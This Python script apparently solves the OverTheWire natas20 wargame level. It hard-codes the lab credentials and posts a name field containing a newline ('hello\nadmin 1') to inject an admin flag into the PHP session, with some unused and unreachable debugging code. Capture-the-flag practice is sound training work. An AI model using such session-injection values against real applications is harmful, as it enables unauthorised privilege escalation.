import sys
import requests as req

username = "natas20"
password = "guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH"
url = "http://%s.natas.labs.overthewire.org/" % username

data = {"name": "hello\nadmin 1"}
s = req.session()

cookie = {"PHPSESSID": "0"}

def encode(i):
	s = ""
	j = int(str(i)[::-1])
	while j:
		d = j % 10
		s += "3" + str(d)
		j //= 10
	while not (i % 10):
		s += "30"
		i //= 10
	return s

j = 1

#print(encode(640))
#sys.exit(0)

while 1:
	print(j, cookie["PHPSESSID"])
	r = s.post(url, auth=(username, password), data=data)
	r = s.get(url, auth=(username, password))
	print(r.text)
	"""
	print(r.cookies)
	print(r.headers)
	"""
	sys.exit(0)
	if not "regular user" in r.text:
		print(r.text)
		break
	j += 1
